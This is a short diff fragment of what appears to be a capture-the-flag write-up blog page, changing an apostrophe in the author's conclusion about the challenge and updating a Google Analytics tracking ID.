-
 <p>Flag 4 : check !!
 (For some reason, the flag was no longer present when I did the challenge again to take screenshots ¯_(ツ)_/¯).</p>
-
 <h2 id="conclusion-and-feedback">Conclusion and Feedback</h2>
-
-<p>A rather interesting and pleasant challenge, despite some negative points, the position of the flags. Indeed, these ones were located in places that may have required a little luck or guessing. Nevertheless, I personally spent a lot of time on this scenario and learned a lot of little things! Congratz&rsquo; to the organizers and all participants!</p>
+<p>A rather interesting and pleasant challenge, despite some negative points, the position of the flags. Indeed, these ones were located in places that may have required a little luck or guessing. Nevertheless, I personally spent a lot of time on this scenario and learned a lot of little things! Congratz' to the organizers and all participants!</p>
   </div>
   
 
@@ -617,7 +512,7 @@ The <code>/admin/console</code> page is unavailable and redirects to the home pa
 var doNotTrack = false;
 if (!doNotTrack) {
 	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
-	ga('create', 'UA-126182747-1', 'auto');
+	ga('create', 'G-GB7QC0EDF8', 'auto');
 	
 	ga('send', 'pageview');
 }
